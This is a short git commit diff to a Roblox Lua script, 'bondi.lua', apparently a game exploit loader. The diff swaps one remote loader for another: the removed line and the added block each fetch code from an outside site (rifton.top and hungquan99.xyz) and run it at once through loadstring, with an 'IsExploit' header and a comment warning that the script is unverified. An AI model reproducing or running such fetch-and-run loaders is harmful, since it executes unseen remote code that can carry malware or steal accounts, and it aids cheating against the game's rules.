426665dba8bdfd18358d55810aa2e3eed8b62b12
VernonMoore54 <denasuper1999@mail.ru>
2025-06-11 13:43:09 +0900

    Update bondi.lua

--- bondi.lua
+++ bondi.lua
@@ -6,4 +6,14 @@ task.wait()
 
 setfpscap(15)
 
-loadstring(game:HttpGet("https://rifton.top/loader.lua"))()
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+getgenv().AutoExecute = true
+(loadstring or load)(request({
+    Url = "https://hungquan99.xyz/HungHub",
+    Method = "GET",
+    Headers = {
+        ["IsExploit"] = "true"
+    }
+}).Body)()
